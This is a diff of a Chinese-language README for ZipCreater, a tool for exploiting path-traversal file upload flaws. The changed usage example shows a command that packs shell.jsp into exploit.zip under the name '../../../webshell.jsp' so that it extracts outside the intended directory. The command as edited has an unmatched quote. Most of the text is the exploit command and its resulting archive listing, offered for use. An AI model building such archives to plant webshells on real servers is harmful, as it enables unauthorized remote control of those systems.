@@ -4,7 +4,7 @@ ZipCreater主要应用于跨目录的文件上传漏洞的利用，它能够快�
 
 使用方式：
 
-假设payload.zip文件压缩内容如下：
+假设`/tmp/payload`文件夹内的文件列表如下：
 
 ```
 1.txt
@@ -12,10 +12,10 @@ ZipCreater主要应用于跨目录的文件上传漏洞的利用，它能够快�
 shell.jsp
 ```
 
-使用ZipCreater可以将shell.jsp的压缩文件名进行更改：
+使用ZipCreater可以生成跨目录的文件名：
 
 ```
-$ zipcreater -dest /tmp/exploit.zip -source /tmp/payload.zip -path '..\..\..\..\..\..\webshell.jsp'
+$ zipcreater -source /tmp/payload/ -dest /tmp/exploit.zip -filename shell.jsp -path ../../../webshell.jsp'
 ```
 
 exploit.zip内容如下：
@@ -23,10 +23,6 @@ exploit.zip内容如下：
 ```
 1.txt
 2.txt
-..\..\..\..\..\..\webshell.jsp
+../../../webshell.jsp
 ```
-
-
-注：ZipCreater只能修改shell.jsp，你可以根据它来修改成自己想要的程序。
-
 
